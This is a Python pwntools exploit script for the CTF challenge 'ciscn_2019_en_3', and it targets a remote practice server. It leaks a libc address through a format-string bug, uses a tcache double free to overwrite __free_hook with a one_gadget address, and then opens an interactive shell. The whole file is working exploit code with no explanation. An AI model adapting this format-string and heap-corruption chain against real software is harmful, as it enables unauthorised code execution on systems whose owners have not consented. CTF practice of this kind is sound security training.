from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_2019_en_3"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25554)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sla("Input your choice:", "1")
    sla("the size of story: \n", str(size))
    sa("inpute the story: \n", con)

def free(index):
    sla("Input your choice:", "4")
    sla("input the index:\n", str(index))


# fmt + double free

# leak libc
name = "%p"*6
sa("What's your name?\n", name)
info = int(rud("Please")[-12:], 16)
print("leak: ", hex(info))

ID = cyclic(0x8)
sa("input your ID.\n", ID)

# count
libc = ELF(libc_path)
base = info-libc.sym["_IO_file_setbuf"]-9
print("base: ", hex(base))
free_hook = base+libc.sym["__free_hook"]
oneshot = base+0x4f322
print("free_hook: ", hex(free_hook))

# double free
add(0x10, "a")
free(0)
free(0)

add(0x10, p64(free_hook))
add(0x10, "a")
add(0x10, p64(oneshot))

# attack
free(0)

shell()


